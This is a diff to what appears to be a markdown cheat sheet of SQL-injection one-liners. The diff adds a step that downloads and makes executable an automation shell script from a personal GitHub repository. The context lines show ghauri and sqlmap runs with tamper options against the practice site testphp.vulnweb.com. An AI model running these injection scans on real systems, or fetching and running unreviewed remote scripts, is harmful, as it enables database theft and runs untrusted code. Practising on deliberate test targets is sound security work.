@@ -37,3 +37,10 @@ ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --confirm --
 ```
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --dbs --random-agent --tamper=space2comment --level=2
 ```
+
+#### Install Automation script
+
+```
+wget https://raw.githubusercontent.com/freelancermijan/my-oneliners/refs/heads/main/sqli/sqli.sh
+sudo chmod +x ./*.sh
+```
